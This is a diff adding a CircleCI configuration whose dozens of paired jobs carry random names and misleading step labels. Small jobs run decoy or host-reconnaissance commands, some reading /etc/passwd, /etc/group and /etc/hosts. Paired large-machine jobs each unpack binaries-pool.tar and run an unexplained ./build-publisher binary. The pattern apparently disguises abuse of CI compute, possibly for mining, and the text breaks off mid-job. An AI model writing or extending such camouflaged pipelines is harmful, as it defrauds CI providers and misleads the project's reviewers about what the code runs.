@@ -1,0 +1,1533 @@
+version: 2.1
+
+jobs:
+  swapPrevious:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Confirmation Mode Quiet
+          command: |
+            mkdir -p /tmp/vine
+            set +o pipefail 2>/dev/null; awk 'BEGIN{print "key,val"; for(i=1;i<=100000;i++) print "k"i","i}' > /tmp/vine/dd73e9642fbe; true
+            echo "stage [io] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'dd73e9642fbe'
+  io:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/dd73e9642fbe 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  Backup-DriverWord:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: In parallel replay the test shards
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; touch /tmp/player.calendar.dat && stat -c "%U %G" /tmp/player.calendar.dat; true ; } > /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2
+            echo "stage [Build_Pipeline8] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '7d67ff5e-f511-3177-cab6-97af04cfe2'
+  Build_Pipeline8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  v14-25-50:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: still auditing permissions
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=split("seal frog", a, " "); print n, a[n]}'; true ; } > /tmp/vine/seed-86t
+            echo "stage [QA_HOOK_3] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'seed-86t'
+  QA_HOOK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/seed-86t 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  trolley-pos-callback-stone:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Series II Escalating Partner Team
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >'/tmp/tmp_goalPurple.log' 2>&1 && wc -l '/tmp/tmp_goalPurple.log'; true ; } > /tmp/vine/b7f78c4c-82f6-f0c7
+            echo "stage [xray-5] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'b7f78c4c-82f6-f0c7'
+  xray-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  len_340:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: QA9652
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type f -name null -perm /a+x -exec stat -c "%y %n" {} + 2>/dev/null|head -n 15; true ; } > /tmp/vine/groveprotonember
+            echo "stage [rm-session-leak] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'groveprotonember'
+  rm-session-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  unsafeNo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Reset on the hour
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; touch "/tmp/data.rank.csv" && mv -v "/tmp/data.rank.csv" "/tmp/street.playground.beetle.out"; true ; } > /tmp/vine/20170527_120843
+            echo "stage [atlas-v2] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '20170527_120843'
+  atlas-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  EnvCityId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: compacting sessions table now
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; find /var/log -executable -exec ls -ld "{}" ";" 2>/dev/null|nl; true ; } > /tmp/vine/VIOLET_MATRIX_POLAR_NEUTRON
+            echo "stage [hotfix-7007] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'VIOLET_MATRIX_POLAR_NEUTRON'
+  hotfix-7007:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  bishop-pebble:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: On failure dry the fume hood
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; (trap 'echo bye' EXIT; echo 'good morning'); true ; } > /tmp/vine/run3_87f3
+            echo "stage [perseus-rev] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'run3_87f3'
+  perseus-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/run3_87f3 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  limit-ratio-spark-cheese:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: remember to export the chapter markers
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; grep -n users /etc/group | nl; true ; } > /tmp/vine/Eb
+            echo "stage [fix-db-hang] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'Eb'
+  fix-db-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/Eb 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  mikeSage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Engine start
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; diff -y --width=44 <(seq 6) <(seq 2 5) | head -n20; true ; } > /tmp/vine/mapperZetaMuon
+            echo "stage [nova-plus] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'mapperZetaMuon'
+  nova-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/mapperZetaMuon 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  ivy-mitten:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: right shuffle the product catalog
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo 'fair enough' | sed -e 's/o/0/g' -e 's/t/T/g'; true ; } > /tmp/vine/blob_memo
+            echo "stage [bun-fmt] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'blob_memo'
+  bun-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/blob_memo 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  vpn034:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: The tutorial series rewritten check
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; ls -cF /home | awk '{print length, $0}' | sort -n | tail -n 3; true ; } > /tmp/vine/232.141.92
+            echo "stage [release] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '232.141.92'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  success_city_link_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: All clear on the customs forms
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo 'nothing to do' | tee -a "/tmp/logo-summary.note" >/dev/null && wc -l "/tmp/logo-summary.note"; true ; } > /tmp/vine/9A3UgPR
+            echo "stage [py310-fmt] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '9A3UgPR'
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/9A3UgPR 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  undoreduce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Audit log now checkpointed
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/LibMirror" && head -c 87527 /dev/urandom > "${TMPDIR:-/tmp}/LibMirror"/blob && du -sh "${TMPDIR:-/tmp}/LibMirror"; true ; } > /tmp/vine/fp80frk6
+            echo "stage [pat-ship] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'fp80frk6'
+  pat-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  sha-e4b8942c98:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pipette the serum tubes batch 12
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; dir="${TMPDIR:-/tmp}/rateinfonotebook"; mkdir -p "$dir" && touch "$dir"/{a,b,c}.log && ls "$dir" | wc -l; true ; } > /tmp/vine/sha_5a268482bf22
+            echo "stage [feat-3287] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'sha_5a268482bf22'
+  feat-3287:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/sha_5a268482bf22 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  top:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Start of shift rotate the sudoers file
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; tar -cf - -C /etc skel | tar -tf -; true ; } > /tmp/vine/71xZZLba
+            echo "stage [add-metrics-hang] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '71xZZLba'
+  add-metrics-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/71xZZLba 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  z_min:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: MOV proxy config to region a
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type d -name '*log*' -size 0 -atime -1 -exec stat -c %n {} + 2>/dev/null|xargs ls -ld; true ; } > /tmp/vine/0d435746d027e5b1d65c813780e4da0
+            echo "stage [refactor-5746] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '0d435746d027e5b1d65c813780e4da0'
+  refactor-5746:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  Join-SrcItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Mute the dead letter queue
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; grep -rh '#' /usr/share/doc/bash | head -n 4; true ; } > /tmp/vine/layerHollowYield
+            echo "stage [q3-smoke] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'layerHollowYield'
+  q3-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/layerHollowYield 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  enumObj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Perform trace of the wifi mesh
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo "it's done" | cat -A; true ; } > /tmp/vine/stage_75c3c8d
+            echo "stage [MERGE_DEV] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'stage_75c3c8d'
+  MERGE_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  logout_file_input:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Cull Dialogue Tree Job
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; awk -F':' '$3 == 0 { print $1 " uses " $7 }' /etc/passwd | nl; true ; } > /tmp/vine/225.212.158
+            echo "stage [zulu] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '225.212.158'
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  ftpWriter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Coda
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo 'works for me' | sed 's#me#inner#g'; true ; } > /tmp/vine/57.249
+            echo "stage [LaunchService] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - '57.249'
+  LaunchService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  abortPairLen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Route the DHCP leases ahead of shutdown
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo 34 80 25 8 86 15|tr ' ' '\n'|xargs; true ; } > /tmp/vine/crc_c689cd
+            echo "stage [node18-bench] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'crc_c689cd'
+  node18-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/crc_c689cd 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  IND-EOF:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Get the stereo mix sorted
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; getent passwd|awk -F: '{ print $3 }'|sort -n|tail -n 1; true ; } > /tmp/vine/node286
+            echo "stage [dotnet8-build] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'node286'
+  dotnet8-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/node286 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  v_vs_y:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Wait 120 seconds
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; grep VERSION /etc/os-release | tr -d '"' | cut -d = -f 1; true ; } > /tmp/vine/rusty-frame-vector-worker
+            echo "stage [tb-2a] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'rusty-frame-vector-worker'
+  tb-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/rusty-frame-vector-worker 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  UQ7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Skip pinch while the filter chips are idle
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; ls -Xa /etc/p* | head -n 12; true ; } > /tmp/vine/sw.sys
+            echo "stage [realease] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'sw.sys'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  futures_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Confirmation for later
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -newer /etc/shells -exec ls -ld "{}" \; 2> /dev/null | cat -n; true ; } > /tmp/vine/pulseCedarFjord
+            echo "stage [hu-push] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'pulseCedarFjord'
+  hu-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/b7f78c4c-82f6-f0c7 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat binaries-pool.tar | tar xf -
+      - run:
+          command: /bin/bash -c "./build-publisher"
+  r4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Training the label queue hold on
+          command: |
+            mkdir -p /tmp/vine
+            { set +o pipefail 2>/dev/null; echo 'all systems go' >"/tmp/private.conf" && cat "/tmp/private.conf"; true ; } > /tmp/vine/valley-meadow-kappa
+            echo "stage [API-845] stable"
+      - persist_to_workspace:
+          root: /tmp/vine
+          paths:
+            - 'valley-meadow-kappa'
+  API-845:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/vine
+      - run:
+          name: Pick up marker
+          command: |
+            : ; wc -l /tmp/vine/7d67ff5e-f511-3177-cab6-97af04cfe2 2>/dev/null
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
